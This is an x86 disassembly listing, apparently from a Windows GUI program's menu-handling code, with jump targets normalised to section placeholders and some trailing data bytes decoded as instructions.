lea eax [ ebp - 0xc ]
mov edx [ ebx + 0x30 ]
mov dl [ edx ]
call sub_404154
mov eax [ ebp - 0xc ]
pop edx
call sub_4080d0
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ ebx + 0x30 ]
call sub_455224
cmp [ ebp - 0x10 ] 0x0
je r-xdata
mov ebx eax
jmp r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45440c
lea eax [ ebp - 0x10 ]
mov edx 0x3
call sub_403f90
retn
sub_454418
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
mov [ ebp - 0xc ] 0xffffffff
mov [ ebp - 0x10 ] 0xffffffff
mov [ ebp - 0x14 ] 0xffffffff
mov eax [ ebx + 0x8 ]
push eax
call GetMenuItemCount
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
cmp [ ebp - 0xc ] 0xffffffff
jge r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
mov eax [ ebx + 0xc ]
cmp eax 0x2
jne r-xdata
mov eax [ ebp - 0x8 ]
dec eax
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_4542d4
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
cmp eax 0x3
jne r-xdata
shl eax 0x10
or eax [ ebp - 0xc ]
mov [ ebx + 0xc ] eax
jmp r-xdata
inc eax
mov [ ebp - 0x18 ] eax
xor esi esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
mov [ ebp - 0xc ] 0xfffffffe
jmp r-xdata
cmp [ ebp - 0x14 ] 0x0
jge r-xdata
inc esi
dec [ ebp - 0x18 ]
jne r-xdata
test di 0x2
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
shl eax 0x10
or eax [ ebp - 0x14 ]
mov [ ebx + 0xc ] eax
mov edx [ ebp - 0xc ]
mov [ ebp - 0x14 ] edx
push 0x400
push esi
mov eax [ ebx + 0x8 ]
push eax
call GetMenuState
mov edi eax
push ebp
mov al [ ebx + 0x4 ]
push eax
mov eax [ ebx + 0x8 ]
mov ecx esi
mov edx edi
call sub_454330
pop ecx
test al al
je r-xdata
cmp [ ebp - 0xc ] 0x0
jge r-xdata
mov [ ebx + 0xc ] 0x10000
jmp r-xdata
mov [ ebp - 0x14 ] esi
mov [ ebx + 0xc ] 0x3
mov [ ebp - 0xc ] esi
mov [ ebx + 0xc ] 0x2
jmp r-xdata
cmp [ ebp - 0x10 ] 0x0
jl r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
test di 0x80
je r-xdata
mov [ ebp - 0x14 ] esi
sub_454590
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax ebx
call sub_453c9c
test al al
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push edi
call GetMenuStringA
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push eax
push esi
push edi
call GetMenuState
test al 0x10
je r-xdata
push esi
push edi
call GetMenuItemID
mov esi eax
cmp esi 0xffffffff
je r-xdata
push esi
push edi
call GetSubMenu
mov edi eax
mov cl 0x1
mov edx edi
mov eax ebx
call sub_453b18
mov [ ebp - 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
xor ecx ecx
mov edx esi
mov eax ebx
call sub_453b18
mov [ ebp - 0x4 ] eax
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x0
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x30 ]
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x10 ]
call sub_40894c
mov eax [ ebp + 0x10 ]
call sub_408890
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0xc
sub_45465c
push ebx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop ebx
retn
mov eax [ ebx + 0x38 ]
call sub_43d784
test eax eax
je r-xdata
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_454638
mov [ ebx + 0x41 ] 0x1
sub_454684
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x41 ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax esi
mov edx [ r-xdata ]
call sub_4033cc
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_454638
mov [ ebx + 0x41 ] 0x1
sub_454710
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
cmp [ edi + 0x38 ] 0x0
je r-xdata
mov al [ ebp + 0x8 ]
push eax
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax edi
call sub_45420c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
mov eax edi
call sub_454094
mov ebx eax
test esi esi
jne r-xdata
test bl bl
je r-xdata
push 0x0
push 0x0
push 0xb015
mov eax [ edi + 0x38 ]
push eax
call SendMessageA
mov eax [ edi + 0x38 ]
push eax
call DrawMenuBar
sub_4547a0
push ebx
push esi
mov ebx eax
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x38 ]
mov eax [ ebx + 0x38 ]
test eax eax
je r-xdata
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0xb015
push eax
call SendMessageA
sub_4547dc
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi eax
mov eax [ ebp + 0x8 ]
mov esi [ eax - 0x4 ]
test esi esi
jl r-xdata
xor eax eax
pop edi
pop esi
pop ebx
pop ebp
retn
inc esi
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x8 ]
add ebx 0x4
dec esi
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
inc [ edx + eax * 4 ]
mov eax [ ebp + 0x8 ]
mov cl [ eax - 0xd ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0xc ]
mov eax edi
call sub_450748
xor eax eax
mov al [ edi + 0x3f ]
cmp eax [ ebx ]
jne r-xdata
sub_454828
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0xc ] edx
mov ebx eax
mov eax ebx
call sub_4542bc
mov [ ebp - 0xd ] al
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
mov edx [ ebp + 0x8 ]
test edx edx
jl r-xdata
mov eax [ ebx + 0x34 ]
mov ecx eax
mov edx [ eax + 0x68 ]
mov eax sub_4547dc
call sub_450184
pop ebx
mov esp ebp
pop ebp
retn 0xc
inc edx
mov eax [ ebp + 0xc ]
xor ecx ecx
mov [ eax ] ecx
add eax 0x4
dec edx
jne r-xdata
sub_454884
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4548ae
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_4548d0
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x30 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_454e03
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ esi ]
cmp eax 0x111
jg r-xdata
sub eax 0x117
je r-xdata
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x2b
je r-xdata
mov eax [ esi + 0x8 ]
push eax
mov eax [ esi + 0x4 ]
push eax
mov eax [ esi ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call DefWindowProcA
mov [ esi + 0xc ] eax
inc ebx
xor edi edi
mov [ ebp - 0xd ] 0x0
test [ esi + 0x6 ] 0x10
je r-xdata
dec eax
je r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x24 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
dec eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454e0a
lea eax [ ebp - 0x30 ]
call sub_403f6c
retn
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov [ ebp - 0xd ] 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x28 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
sub eax 0x27
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edx [ esi + 0x4 ]
call sub_453bd4
test al al
jne r-xdata
jmp r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_460d20
jmp r-xdata
inc ebx
xor edi edi
inc ebx
xor edi edi
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov dx [ esi + 0x4 ]
call sub_453bb8
test al al
jne r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_454c36
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_454c19
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x24 ]
mov edx [ eax + 0x18 ]
mov eax [ ebp - 0x14 ]
call sub_423e4c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_423cec
mov eax [ ebp - 0x24 ]
mov ax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x24 ]
lea ecx [ eax + 0x1c ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
call sub_4550a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454c20
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423e4c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x24 ]
mov eax [ eax + 0x18 ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
mov eax [ esi + 0x8 ]
mov [ ebp - 0x20 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
jmp r-xdata
movzx eax [ esi + 0x4 ]
mov [ ebp - 0x8 ] eax
mov eax [ esi + 0x8 ]
test eax eax
je r-xdata
mov edx esi
mov eax [ ebp - 0x2c ]
call sub_454418
jmp r-xdata
mov edx [ esi + 0x8 ]
mov cl 0x1
mov eax [ ebp - 0x2c ]
call sub_453b18
test eax eax
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edx [ ebp - 0x24 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_453b18
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call GetWindowDC
mov [ ebp - 0x1c ] eax
xor eax eax
push ebp
push sub_454d79
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_4237d4
mov [ ebp - 0x14 ] eax
xor eax eax
push ebp
push sub_454d54
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x1c ]
push eax
call SaveDC
mov [ ebp - 0x18 ] eax
xor eax eax
push ebp
push sub_454d37
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebp - 0x1c ]
mov eax [ ebp - 0x14 ]
call sub_423e4c
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x88 ]
mov eax [ ebp - 0x14 ]
call sub_423cec
mov eax [ ebp - 0x28 ]
add eax 0x10
push eax
mov eax [ ebp - 0x28 ]
lea ecx [ eax + 0xc ]
mov edx [ ebp - 0x14 ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_454d3e
xor edx edx
mov eax [ ebp - 0x14 ]
call sub_423e4c
mov eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call RestoreDC
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x58 ]
call sub_43da08
mov edx [ ebp - 0x30 ]
mov eax [ rw-data ]
mov eax [ eax ]
call sub_460d20
jmp r-xdata
mov [ ebp - 0x8 ] 0xffffffff
jmp r-xdata
movzx edx [ esi + 0x4 ]
push edx
push eax
call GetSubMenu
mov [ ebp - 0x8 ] eax
jmp r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edx [ ebp - 0x28 ]
mov edx [ edx + 0x8 ]
xor ecx ecx
call sub_453b18
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
jmp r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
mov cl 0x1
call sub_453b18
mov [ ebp - 0xc ] eax
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov eax [ eax + 0x34 ]
mov [ ebp - 0xc ] eax
jmp r-xdata
cmp [ ebp - 0xd ] 0x1
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov cl [ ebp - 0xd ]
mov edx [ ebp - 0x8 ]
call sub_453b18
mov [ ebp - 0xc ] eax
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov [ ebp - 0x2c ] eax
mov eax [ ebp - 0x2c ]
mov edx [ eax ]
call [ edx + 0x34 ]
cmp eax [ esi + 0x8 ]
je r-xdata
inc edi
dec ebx
jne r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0x8 ]
mov cl 0x1
call sub_453b48
test eax eax
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edx [ eax ]
call [ edx + 0x34 ]
mov edx [ ebp - 0x20 ]
cmp eax [ edx + 0xc ]
jne r-xdata
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov edx [ edx + 0x6c ]
test edx edx
je r-xdata
mov edx edi
mov eax [ ebp - 0x4 ]
call sub_41a19c
mov edx [ ebp - 0x20 ]
mov edx [ edx + 0xc ]
xor ecx ecx
call sub_453b48
test eax eax
jne r-xdata
mov ecx [ rw-data ]
test [ edx + 0x228 ] 0x8
je r-xdata
mov eax [ rw-data ]
mov eax [ edx + 0x158 ]
mov edx [ rw-data ]
mov edx [ edx ]
xchg edx eax
call sub_4609c4
jmp r-xdata
mov edx [ rw-data ]
mov edx [ edx ]
mov ecx eax
mov eax 0x8
xchg edx eax
call sub_460a2c
jmp r-xdata
sub_454d5b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x1c ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x10 ]
push eax
call ReleaseDC
retn
sub_454e14
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx esi
mov eax ebx
call sub_41a040
pop esi
pop ebx
retn
push ebx
push sub_454884
call sub_420c88
mov [ ebx + 0x10 ] eax
sub_454e58
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_453930
mov [ esi + 0x58 ] 0xffffffff
mov [ esi + 0x5c ] 0xffffffff
mov eax [ esi + 0x34 ]
mov [ eax + 0x8c ] esi
mov edx [ esi ]
mov edx [ edx + 0x3c ]
mov [ eax + 0x88 ] edx
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
mov [ esi + 0x38 ] eax
mov [ esi + 0x61 ] 0x1
mov edx esi
mov eax [ rw-data ]
call sub_454e14
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax esi
pop esi
pop ebx
retn
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_454ecc
push ebx
push esi
call sub_4035a8
mov ebx edx
mov esi eax
mov edx esi
mov eax [ rw-data ]
call sub_454e3c
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4539cc
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403590
sub_454f24
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
je r-xdata
pop ebx
retn
cmp [ ebx + 0x41 ] 0x0
je r-xdata
lea eax [ ebx + 0x58 ]
call sub_44fcc8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov dl [ eax + 0x34 ]
mov eax ebx
call sub_454638
mov [ ebx + 0x41 ] 0x1
mov dl [ eax + 0x5f ]
mov eax ebx
call sub_454638
mov [ ebx + 0x41 ] 0x1
jmp r-xdata
sub_454f6c
push esi
xor edx edx
mov ecx [ rw-data ]
cmp [ ecx + 0xd ] 0x0
je r-xdata
mov eax edx
pop esi
retn
cmp [ eax + 0x41 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x1
sete dl
add eax 0x58
call sub_44fcc8
test eax eax
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
call sub_45f4c8
mov edx eax
jmp r-xdata
mov si 0xffc8
call sub_403418
mov edx eax
jmp r-xdata
sub_454fb8
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov edi ecx
mov esi edx
mov ebx eax
mov ecx esp
mov edx edi
mov eax esi
call sub_418d40
mov eax [ esp ]
mov [ ebx + 0x58 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x5c ] eax
mov eax ebx
call sub_454f24
mov edx ebx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x3c ]
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_453284
xor edx edx
mov eax [ ebx + 0x34 ]
call sub_453780
mov eax [ ebx + 0x34 ]
call sub_450b28
mov eax ebx
call sub_454128
mov eax ebx
call sub_454f6c
and eax 0x7f
lea eax [ eax + eax * 2 ]
lea eax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x60 ]
mov bp [ eax + edx * 2 ]
xor eax eax
mov al [ ebx + 0x68 ]
or bp [ eax * 2 + rw-data ]
movzx ebp bp
xor eax eax
mov al [ ebx + 0x69 ]
shl eax 0xa
or ebp eax
push 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x10 ]
push eax
push 0x0
push edi
push esi
push ebp
mov eax [ ebx + 0x34 ]
call sub_450c58
push eax
call TrackPopupMenu
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_45506c
push ebx
push esi
push edi
push ebp
mov ebp edx
mov edi eax
mov eax [ edi + 0x4 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a19c
xor edx edx
mov [ eax ] edx
mov eax [ edi + 0x4 ]
mov edx ebx
call sub_41a19c
cmp ebp [ eax ]
jne r-xdata
sub_4550a8
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov esi ecx
lea edi [ ebp - 0x15 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edi edx
mov [ ebp - 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x4
jg r-xdata
mov bl 0x1
mov eax [ rw-data ]
cmp [ eax ] 0x4
jne r-xdata
test bl bl
je r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor ebx ebx
jmp r-xdata
mov eax [ rw-data ]
cmp [ eax ] 0x0
jg r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423684
mov edx 0xff000007
mov eax [ edi + 0xc ]
call sub_422eb8
test [ ebp + 0x8 ] 0x80
je r-xdata
mov edx 0xff00000d
mov eax [ edi + 0x14 ]
call sub_423684
mov edx 0xff00000e
mov eax [ edi + 0xc ]
call sub_422eb8
jmp r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xfff2
call sub_403418
mov edx [ r-xdata ]
call sub_4033a8
mov [ ebp - 0x5 ] al
test [ ebp + 0x8 ] 0x1
je r-xdata
mov edx 0xff000004
mov eax [ edi + 0x14 ]
call sub_423684
mov edx 0xff000011
mov eax [ edi + 0xc ]
call sub_422eb8
jmp r-xdata
mov ax [ ebp + 0x8 ]
push eax
mov al [ ebp - 0x5 ]
push eax
lea ecx [ ebp - 0x15 ]
mov edx edi
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
test bl bl
jne r-xdata
sub_455190
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_403fc0
mov ebx 0x1
jmp r-xdata
mov eax [ esi ]
call sub_40422c
cmp ebx eax
jle r-xdata
mov eax [ esi ]
mov al [ eax + ebx - 0x1 ]
mov edx [ rw-data ]
mov ecx eax
and ecx 0xff
bt [ edx ] ecx
jae r-xdata
pop esi
pop ebx
retn
cmp al 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
mov eax esi
mov ecx 0x1
mov edx ebx
call sub_4044cc
cmp ebx 0x1
jle r-xdata
mov eax [ esi ]
call sub_40422c
sub eax ebx
cmp eax 0x2
jl r-xdata
mov eax [ esi ]
cmp [ eax + ebx - 0x2 ] 0x28
jne r-xdata
mov eax [ esi ]
cmp [ eax + ebx + 0x1 ] 0x29
jne r-xdata
mov edx ebx
dec edx
mov eax esi
mov ecx 0x4
call sub_4044cc
jmp r-xdata
sub_455224
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax ebp
call sub_403f6c
mov ebx 0x1
mov eax esi
call sub_40422c
mov edi eax
cmp edi ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ rw-data ]
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ eax ] edx
jae r-xdata
cmp [ esi + ebx - 0x1 ] 0x26
jne r-xdata
inc ebx
jmp r-xdata
inc ebx
cmp edi ebx
jge r-xdata
mov eax edi
sub eax ebx
dec eax
jl r-xdata
inc ebx
cmp [ esi + ebx - 0x1 ] 0x26
je r-xdata
mov eax ebp
mov dl [ esi + ebx - 0x1 ]
call sub_404154
sub_455288
push ebp
mov ebp esp
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4552e1
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_455190
mov eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_455190
mov eax [ ebp - 0x8 ]
pop edx
call sub_408108
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4552e8
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
sub_4552f0
adc al [ eax ]
add [ eax ] al
js r-xdata
add [ eax - 0x3 ] bh
inc esi
add [ eax ] dl
inc edi
add [ ebp + edi * 8 + 0x46 ] dh
add [ eax + 0x70004764 ] dh
std
inc esi
add [ eax + 0x64 ] cl
inc edi
add [ ebp + edi * 8 + 0x46 ] ch
add [ esp - 0x297ffb9 ] al
inc esi
add al bh
inc edi
add [ ebp + edi * 8 + 0x46 ] ah
add [ esp - 0x29fffb9 ] dl
inc esi
add [ esi + 0x47 ] bl
add [ ebp + edi * 8 + 0x46 ] bl
add [ ebp - 0x2a7ffb9 ] dh
inc esi
add [ eax + 0x54004768 ] cl
std
inc esi
add [ eax + ebp * 2 - 0x2afffb9 ] al
inc esi
add [ ebp + 0x47 ] bl
add [ ebp + edi * 8 + 0x46 ] cl
add [ eax + ebp * 2 + 0x47 ] al
add [ eax - 0x3 ] cl
inc esi
add [ eax ] al
push 0xfd440047
inc esi
add al ah
push 0xfd400047
inc esi
add [ eax + ebp * 2 - 0x2c3ffb9 ] ah
inc esi
add [ eax + 0x65 ] dh
inc edi
add [ eax ] bh
std
inc esi
add [ ebp - 0x2cbffb9 ] al
inc esi
add ah dl
inc edi
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4553e8
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4553ef
retn
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
mov eax [ rw-data ]
call sub_40321c
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404a20
mov eax rw-data
call sub_403f6c
sub_4553f4
sub [ rw-data ] 0x1
jae r-xdata
retn
mov eax sub_4552f0
call sub_403d18
mov eax [ r-xdata ]
call sub_4199d8
mov eax [ r-xdata ]
call sub_419a78
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
mov edx [ r-xdata ]
mov eax [ r-xdata ]
call sub_419a24
mov eax [ r-xdata ]
call sub_41991c
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4031ec
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_42a650
mov [ rw-data ] eax
sub_4554e0
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
dec esp
push ebp
inc ebp
dec esp
push ebp
inc ebp
add [ edi ] al
add [ esp + esi + 0x40 ] ah
add [ eax + 0x34 ] dh
inc eax
add [ esp + esi + 0x40 ] dh
add [ eax + 0x34 ] bh
inc eax
add [ esp + esi + 0x40 ] ch
add [ ecx + esi + 0x31d00040 ] dh
inc eax
add [ edi ] dl
inc ecx
add [ eax + ebp * 4 ] ah
inc ecx
add [ eax + ebp * 4 ] ch
inc ecx
add [ eax ] dl
js r-xdata
add [ eax ] al
add [ eax + 0x8 ] al
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
push eax
jle r-xdata
add [ ecx ] dl
insb
inc edx
popad
jb r-xdata
adc [ eax ] al
sbb al [ eax ]
add bh bh
sbb al [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add eax [ eax ]
push es
dec ebp
popad
jb r-xdata
add [ eax ] al
add [ edx ] cl
inc edx
jne r-xdata
push ebp
inc ebp
add [ eax + 0xd00417f ] bh
add [ 0x6d726f46 ] al
jae r-xdata
dec [ eax ]
js r-xdata
inc [ ecx ]
add [ 0x6f6c6f43 ] al
jb r-xdata
outsd
insb
push ebx
arpl [ edx + 0x6f ] si
insb
insb
inc edx
popad
jb r-xdata
popad
outsb
add [ gs : bx + si ] dl
imul ebp [ esi ] 0x2c004010
push eax
je r-xdata
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or al [ edx + 0x75 ]
je r-xdata
add [ eax + edx + 0x40 ] dl
add [ eax + eax ] ah
add bh bh
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
add al 0x0
or edx [ eax + 0x61 ]
jb r-xdata
